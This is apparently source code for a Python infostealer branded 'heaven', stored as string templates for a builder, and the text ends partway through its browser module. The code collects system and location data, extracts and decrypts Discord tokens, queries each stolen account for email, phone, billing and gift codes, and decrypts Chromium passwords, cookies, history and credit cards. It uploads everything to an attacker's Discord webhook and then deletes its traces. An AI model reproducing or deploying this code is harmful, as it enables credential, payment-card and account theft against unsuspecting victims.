

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Obligatory = r'''
import os
import platform
import ctypes
from screeninfo import *
import psutil
import GPUtil
import sqlite3
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
import json
from json import *
import socket
import requests
from Crypto.Cipher import AES
import subprocess
import datetime
import base64
import re
import string
import win32api
import discord
from discord import Embed, File, SyncWebhook
import sys
import shutil
from pathlib import Path
from zipfile import ZipFile
from win32crypt import CryptUnprotectData
from typing import Literal
import uuid
from PIL import ImageGrab
import time
import browser_cookie3

def Startup():
    ()
def System_Grab():
    ()
def Screenshot_Grab():
    ()
def Discord_Grab():
    ()
def Browser_Grab():
    ()
def Roblox_Grab():
    ()
def Fake_Error():
    ()

def current_time_day_hour():
    return datetime.datetime.now().strftime('%Y/%m/%d - %H:%M:%S')

color_embed = 0xFF00FF
username_embed = 'heaven'
avatar_embed = 'https://cdn.discordapp.com/attachments/1213157537634062490/1224235193871761488/photo_2024-03-19_11-35-14.jpg?ex=661cc0df&is=660a4bdf&hm=4f4eea32731239abdac79ee28416b7a98c10da1c6f0458b107396460734a07a7&'
footer_embed = {
        "text": f"heaven | {current_time_day_hour()}",
        "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
        }
footer_text = f"heaven | {current_time_day_hour()}"
                 

try:
        hostname_pc = socket.gethostname()
except:
        hostname_pc = "None"

try:
        username_pc = os.getlogin()
except:
        username_pc = "None"


try:
    displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except:
    displayname_pc = "None"

try:
    response = requests.get('https://httpbin.org/ip')
    ip_address_public = response.json()['origin']
except:
    ip_address_public = "None"



try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))  

    ip_address_ipv4 = s.getsockname()[0]
    s.close()
except:
    ip_address_ipv4 = "None"



try:
    ip_address_ipv6 = []
    all_interfaces = socket.getaddrinfo(socket.gethostname(), None)
    for interface in all_interfaces:
        if interface[0] == socket.AF_INET6:
            ip_address_ipv6.append(interface[4][0])
except:
        ip_address_ipv6 = "None"


try:
    try:
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_public}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
    except:
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_ipv6}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)

    try:
        country_code = ipdata["country_code"].lower()
    except:
        country_code = "None"
except:
    country_code = "None"

try:
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address_public}")
        data = response.json()
        status = data["status"]
    except:
        response = requests.get(f"http://ip-api.com/json/{ip_address_ipv6}")
        data = response.json()
        status = data["status"]

    if status in ["fail"]:
        status = "Invalid"
        ip_adress, country, country_code, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number, url_position = "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None"
    else:
        status = "Valid"
        ip_adress = data["query"]
        country = data["country"]
        region = data["regionName"]
        region_code = data["region"]
        city = data["city"]
        zip_postal = data["zip"]
        latitude = data["lat"]
        longitude = data["lon"]
        timezone = data["timezone"]
        isp = data["isp"]
        org = data["org"]
        as_number = data["as"]
        url_position = f"https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"
except:
    ip_adress, country, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number, url_position = "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None"
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

SystemGrab = r'''
def System_Grab():
    try:
        system_info = {platform.system()}
    except:
        system_info = "None"

    try:
        system_version_info = platform.version()
    except:
        system_version_info = "None"

    try:
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except:
        mac_address = "None"
    try:
        hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except:
        hwid = "None"

    try:
        ram_info = round(psutil.virtual_memory().total / (1024**3), 2)
    except:
        ram_info = "None"


    try:
        cpu_info = platform.processor()
    except:
        cpu_info = "None"

    try:
        cpu_core_info = psutil.cpu_count(logical=False)
    except:
        cpu_core_info = "None"


    try:
        gpus = GPUtil.getGPUs()
        gpu_info = gpus[0].name if gpus else "None"
    except:
        gpu_info = "None"

    try:
        drives_info = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ":\\"
                try:
                    free_bytes = ctypes.c_ulonglong(0)
                    total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_path), None, ctypes.pointer(total_bytes), ctypes.pointer(free_bytes))
                    total_space = total_bytes.value
                    free_space = free_bytes.value
                    used_space = total_space - free_space
                    drive_name = win32api.GetVolumeInformation(drive_path)[0]
                    drive = {
                        'drive': drive_path,
                        'total': total_space,
                        'free': free_space,
                        'used': used_space,
                        'name': drive_name,
                    }
                    drives_info.append(drive)
                except:
                    ()
            bitmask >>= 1

        disk_stats = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for drive in drives_info:
            use_percent = (drive['used'] / drive['total']) * 100
            free_space_gb = "{:.2f}GO".format(drive['free'] / (1024 ** 3))
            total_space_gb = "{:.2f}GO".format(drive['total'] / (1024 ** 3))
            use_percent_str = "{:.2f}%".format(use_percent)
            disk_stats += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(drive['drive'], 
                                                                   free_space_gb,
                                                                   total_space_gb,
                                                                   use_percent_str,
                                                                   drive['name'])
    except:
        disk_stats = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        directory = os.getcwd()
        disk_letter = os.path.splitdrive(directory)[0]
    except:
        disk_letter = "None"


    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if is_portable():
            platform_info = 'Pc Portable'
        else:
            platform_info = 'Pc Fixed'
    except:
        platform_info = "None"


    try:
        def get_resolution():
            hdc = ctypes.windll.user32.GetDC(0)
            width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8)  
            height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10)
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return width, height

        for i, monitor in enumerate(get_monitors(), 1):
            if monitor.is_primary:
                width, height = get_resolution()
                name = monitor.name
                is_primary = 'Yes'

        main_screen = f"""Name         : "{name}" 
Resolution   : "{width}x{height}"
Main Screen  : "{is_primary}"
"""
    except:
        main_screen = "None"


    try:
        def get_resolution():
            hdc = ctypes.windll.user32.GetDC(0)
            width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8) 
            height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10) 
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return width, height


        monitors = list(get_monitors())

        if len(monitors) > 1:

            second_monitor = monitors[1]

            width, height = get_resolution()

            second_screen =  f"""Name         : "{name}" 
Resolution   : "{width}x{height}"
Main Screen  : "No"
"""
        else:
            second_screen = 'None'
    except:
        second_screen = "None"


    def embed_system(webhook_url, title, fields, color, footer, username, avatar):

        embed_data = {
            'title': title,
            "fields": fields,
            'color': color,
            "footer": footer,
            "thumbnail": {
                "url": ""
                }
        
        }


        data = {
            'embeds': [embed_data],
            'username': username,  
            'avatar_url': avatar
        }


        json_data = json.dumps(data)


        headers = {
            'Content-Type': 'application/json'
        }


        requests.post(webhook_url, data=json_data, headers=headers)

    title = f':flag_{country_code}: | System Info `{username_pc} "{ip_address_public}"`:'

    fields = [
    {"name": f":bust_in_silhouette: | User Pc:", "value": f"""```Name        : "{hostname_pc}"
Username    : "{username_pc}"
DisplayName : "{displayname_pc}"```""", "inline": False},

    {"name": f":computer: | System:", "value": f"""```Plateform    : "{platform_info}"
Exploitation : "{system_info} {system_version_info}"

HWID : "{hwid}"
MAC  : "{mac_address}"
CPU  : "{cpu_info}, {cpu_core_info} Core"
GPU  : "{gpu_info}"
RAM  : "{ram_info}Go"```""", "inline": False},

{"name": f":satellite: | Ip:", "value": f"""```
Public : "{ip_address_public}"
Ipv4   : "{ip_address_ipv4}"
Ipv6   : "{ip_address_ipv6}"
Isp    : "{isp}"
Org    : "{org}"
As     : "{as_number}"```""", "inline": False},

{"name": f":minidisc: | Disk:", "value": f"""```{disk_stats}```""", "inline": False},

{"name": f":desktop: | Screen:", "value": f"""```Main Screen:
{main_screen}

Secondary Screen:
{second_screen}```""", "inline": False},

{"name": f":flag_{country_code}: | Location:", "value": f"""```Country   : "{country} ({country_code})"
Region    : "{region} ({region_code})"
Zip       : "{zip_postal}"
City      : "{city}"
Timezone  : "{timezone}"
Latitude  : "{latitude}"
Longitude : "{longitude}"
```""", "inline": False},

] 
    embed_system(webhook_url, title, fields, color_embed, footer_embed, username_embed, avatar_embed)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

DiscordGrab = r'''
def Discord_Grab():
    class Discord:
        def __init__(self, webhook):
            upload_tokens(webhook).upload()

    class extract_tokens:
        def __init__(self) -> None:
            self.base_url = "https://discord.com/api/v9/users/@me"
            self.appdata = os.getenv("localappdata")
            self.roaming = os.getenv("appdata")
            self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

            self.tokens, self.uids = [], []

            self.extract()

        def extract(self) -> None:
            paths = {
                'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
                'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
                'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
                'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
                'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
                'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
                'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
                'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
                'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
                'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
                'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
                'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
                'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
            }

            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                _discord = name.replace(" ", "").lower()
                if "cord" in path:
                    if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.regexp_enc, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
                                                         1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))

                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

            if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                    for _file in files:
                        if not _file.endswith('.sqlite'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

        def validate_token(self, token: str) -> bool:
            r = requests.get(self.base_url, headers={'Authorization': token})

            if r.status_code == 200:
                return True

            return False

        def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass

        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return

            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

            return master_key

    class upload_tokens:
        def __init__(self, webhook: str):
            self.tokens = extract_tokens().tokens
            self.webhook = SyncWebhook.from_url(webhook)

        def calc_flags(self, flags: int) -> list:
            flags_dict = {
                "DISCORD_EMPLOYEE": {
                    "emoji": "<:staff:968704541946167357>",
                    "shift": 0,
                    "ind": 1
                },
                "DISCORD_PARTNER": {
                    "emoji": "<:partner:968704542021652560>",
                    "shift": 1,
                    "ind": 2
                },
                "HYPESQUAD_EVENTS": {
                    "emoji": "<:hypersquad_events:968704541774192693>",
                    "shift": 2,
                    "ind": 4
                },
                "BUG_HUNTER_LEVEL_1": {
                    "emoji": "<:bug_hunter_1:968704541677723648>",
                    "shift": 3,
                    "ind": 4
                },
                "HOUSE_BRAVERY": {
                    "emoji": "<:hypersquad_1:968704541501571133>",
                    "shift": 6,
                    "ind": 64
                },
                "HOUSE_BRILLIANCE": {
                    "emoji": "<:hypersquad_2:968704541883261018>",
                    "shift": 7,
                    "ind": 128
                },
                "HOUSE_BALANCE": {
                    "emoji": "<:hypersquad_3:968704541874860082>",
                    "shift": 8,
                    "ind": 256
                },
                "EARLY_SUPPORTER": {
                    "emoji": "<:early_supporter:968704542126510090>",
                    "shift": 9,
                    "ind": 512
                },
                "BUG_HUNTER_LEVEL_2": {
                    "emoji": "<:bug_hunter_2:968704541774217246>",
                    "shift": 14,
                    "ind": 16384
                },
                "VERIFIED_BOT_DEVELOPER": {
                    "emoji": "<:verified_dev:968704541702905886>",
                    "shift": 17,
                    "ind": 131072
                },
                "ACTIVE_DEVELOPER": {
                    "emoji": "<:Active_Dev:1045024909690163210>",
                    "shift": 22,
                    "ind": 4194304
                },
                "CERTIFIED_MODERATOR": {
                    "emoji": "<:certified_moderator:988996447938674699>",
                    "shift": 18,
                    "ind": 262144
                },
                "SPAMMER": {
                    "emoji": "⌨",
                    "shift": 20,
                    "ind": 1048704
                },
            }

            return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]

        def upload(self):
            if not self.tokens:
                return

            for token_discord in self.tokens:
                user = requests.get(
                    'https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord}).json()
                billing_discord = requests.get(
                    'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_discord}).json()
                guilds = requests.get(
                    'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token_discord}).json()
                friends = requests.get(
                    'https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token_discord}).json()
                gift_codes_discord = requests.get(
                    'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_discord}).json()

                username_discord = user['username'] + '#' + user['discriminator']
                user_id_discord = user['id']
                email_discord = user['email']
                phone_discord = user['phone']
                mfa_discord = user['mfa_enabled']
                try:
                    avatar_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif" if requests.get(
                        f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.png"
                except:
                    avatar_discord = avatar_embed
                badges_discord = ' '.join([flag[0]
                                  for flag in self.calc_flags(user['public_flags'])])

                if user['premium_type'] == 0:
                    nitro_discord = 'None'
                elif user['premium_type'] == 1:
                    nitro_discord = 'Nitro Classic'
                elif user['premium_type'] == 2:
                    nitro_discord = 'Nitro Boosts'
                elif user['premium_type'] == 3:
                    nitro_discord = 'Nitro Basic'
                else:
                    nitro_discord = 'None'

                if billing_discord:
                    payment_methods = []

                    for method in billing_discord:
                        if method['type'] == 1:
                            payment_methods.append('💳')

                        elif method['type'] == 2:
                            payment_methods.append("Paypal: ")

                        else:
                            payment_methods.append('❓')

                    payment_methods = ', '.join(payment_methods)

                else:
                    billing_discord = None

                if guilds:
                    hq_guilds_discord = []
                    for guild in guilds:
                        admin = True if guild['permissions'] == '4398046511103' else False
                        if admin and guild['approximate_member_count'] >= 100:
                            owner = "✅" if guild['owner'] else "❌"

                            invites = requests.get(
                                f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token_discord}).json()
                            if len(invites) > 0:
                                invite = f"https://discord.gg/{invites[0]['code']}"
                            else:
                                invite = "None"

                            data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"

                            if len('\n'.join(hq_guilds_discord)) + len(data) >= 1024:
                                break

                            hq_guilds_discord.append(data)

                    if len(hq_guilds_discord) > 0:
                        hq_guilds_discord = '\n'.join(hq_guilds_discord)

                    else:
                        hq_guilds_discord = None

                else:
                    hq_guilds_discord = None

                if friends:
                    hq_friends_discord = []
                    for friend in friends:
                        unprefered_flags = [64, 128, 256, 1048704]
                        inds = [flag[1] for flag in self.calc_flags(
                            friend['user']['public_flags'])[::-1]]
                        for flag in unprefered_flags:
                            inds.remove(flag) if flag in inds else None
                        if inds != []:
                            hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
                                friend['user']['public_flags'])[::-1]])

                            data = f"{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})  "

                            if len('\n'.join(hq_friends_discord)) + len(data) >= 1024:
                                break

                            hq_friends_discord.append(data)

                    if len(hq_friends_discord) > 0:
                        hq_friends_discord = '\n'.join(hq_friends_discord)

                    else:
                        hq_friends_discord = None

                else:
                    hq_friends_discord = None

                if gift_codes_discord:
                    codes = []
                    for code in gift_codes_discord:
                        name = code['promotion']['outbound_title']
                        code = code['code']

                        data = f":gift: `{name}`\n:ticket: `{code}`"

                        if len('\n\n'.join(codes)) + len(data) >= 1024:
                            break

                        codes.append(data)

                    if len(codes) > 0:
                        codes = '\n\n'.join(codes)

                    else:
                        codes = None

                else:
                    gift_codes_discord = None

                embed = Embed(title=f':flag_{country_code}: | Discord Info `{username_pc} "{ip_address_public}"`:', color=color_embed)
                embed.set_thumbnail(url=avatar_discord)

                embed.add_field(name=":bust_in_silhouette: | Username:",
                                value=f"```{username_discord}```", inline=True)
                embed.add_field(name=":robot: | Id:",
                                value=f"```{user_id_discord}```", inline=True)
                embed.add_field(name=":e_mail: | Email:",
                                value=f"```{email_discord}```", inline=True)
                embed.add_field(name=":telephone_receiver: | Phone:",
                                value=f"```{phone_discord}```", inline=True)   
                embed.add_field(name=":globe_with_meridians: | Token:",
                                value=f"```{token_discord}```", inline=True)
                embed.add_field(name=":rocket: | Nitro:",
                                value=f"```{nitro_discord}```", inline=True)
                embed.add_field(name=":moneybag: | Billing:",
                                value=f"```{billing_discord}```", inline=True)
                embed.add_field(name=":people_hugging: | Friends:",
                                value=f"```{hq_friends_discord}```", inline=True)
                embed.add_field(name=":tickets: | Badges:",
                                value=f"{badges_discord}", inline=True)   
                embed.add_field(name=":gift: | Gift Code:",
                                value=f"```{gift_codes_discord}```", inline=True)
                embed.add_field(name=":lock: | Multi-Factor Authentication:",
                                value=f"```{mfa_discord}```", inline=True)
                embed.add_field(name=":link: | Guilds:",
                                value=f"{hq_guilds_discord}", inline=True)

                embed.set_footer(text=footer_text, icon_url=avatar_embed)

                self.webhook.send(embed=embed, username=username_embed,
                                  avatar_url=avatar_embed)

    Discord(webhook_url)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

BrowserGrab = r'''
def Browser_Grab():
    __LOGINS__ = []
    __COOKIES__ = []
    __WEB_HISTORY__ = []
    __DOWNLOADS__ = []
    __CARDS__ = []

    class Browser:
        def __init__(self, webhook):
            self.webhook = SyncWebhook.from_url(webhook)

            Chromium()
            Upload(self.webhook)


    class Upload:

        def __init__(self, webhook: SyncWebhook):
            self.webhook = webhook

            self.write_files()
            self.send()
            self.clean()

        def write_files(self):
            os.makedirs(f"Browsers_{username_pc}", exist_ok=True)
            if __LOGINS__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_passwords.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __LOGINS__))

            if __COOKIES__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_cookies.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __COOKIES__))

            if __WEB_HISTORY__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_history.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

            if __DOWNLOADS__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_downloads.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __DOWNLOADS__))

            if __CARDS__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_cards.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __CARDS__))

            with ZipFile(f"Browsers_{username_pc}.zip", "w") as zip:
                for file in os.listdir(f"Browsers_{username_pc}"):
                    zip.write(f"Browsers_{username_pc}\\{file}", file)

        def send(self):
            self.webhook.send(
                embed=Embed(
                    title=f":flag_{country_code}: | Browsers Info `{username_pc} \"{ip_address_public}\"`:",
                    description="```" +
                    '\n'.join(self.tree(Path(f"Browsers_{username_pc}"))) + "```",
                    color=color_embed,
                ).set_footer(
                     text=footer_text,
                     icon_url=avatar_embed
                ),
                file=File(f"Browsers_{username_pc}.zip"),
                username=username_embed,
                avatar_url=avatar_embed,
            )

        def clean(self):
            shutil.rmtree(f"Browsers_{username_pc}")
            os.remove(f"Browsers_{username_pc}.zip")

        def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
            pipes = {
                'space':  '    ',
                'branch': '│   ',
                'tee':    '├── ',
                'last':   '└── ',
            }

            if prefix == '':
                yield midfix_folder + path.name

            contents = list(path.iterdir())
            pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
            for pointer, path in zip(pointers, contents):
                if path.is_dir():
                    yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                    extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                    yield from self.tree(path, prefix=prefix+extension)
                else:
                    yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
        

    class Chromium:

        def __init__(self):
            self.appdata = os.getenv('LOCALAPPDATA')
            self.browsers = {
                'amigo': self.appdata + '\\Amigo\\User Data',
                'torch': self.appdata + '\\Torch\\User Data',
                'kometa': self.appdata + '\\Kometa\\User Data',
                'orbitum': self.appdata + '\\Orbitum\\User Data',
                'cent-browser': self.appdata + '\\CentBrowser\\User Data',
                '7star': self.appdata + '\\7Star\\7Star\\User Data',
                'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
                'vivaldi': self.appdata + '\\Vivaldi\\User Data',
                'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
                'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
                'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
                'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
                'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
                'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
                'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
                'iridium': self.appdata + '\\Iridium\\User Data',
            }
            self.profiles = [
                'Default',
                'Profile 1',
                'Profile 2',
                'Profile 3',
                'Profile 4',
                'Profile 5',
            ]

            for _, path in self.browsers.items():
                if not os.path.exists(path):
                    continue

                self.master_key = self.get_master_key(f'{path}\\Local State')
                if not self.master_key:
                    continue

                for profile in self.profiles:
                    if not os.path.exists(path + '\\' + profile):
                        continue

                    operations = [
                        self.get_login_data,
                        self.get_cookies,
                        self.get_web_history,
                        self.get_downloads,
                        self.get_credit_cards,
                    ]

                    for operation in operations:
                        try:
                            operation(path, profile)
                        except Exception as e:
                            # print(e)
                            pass

        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return

            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

        def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass

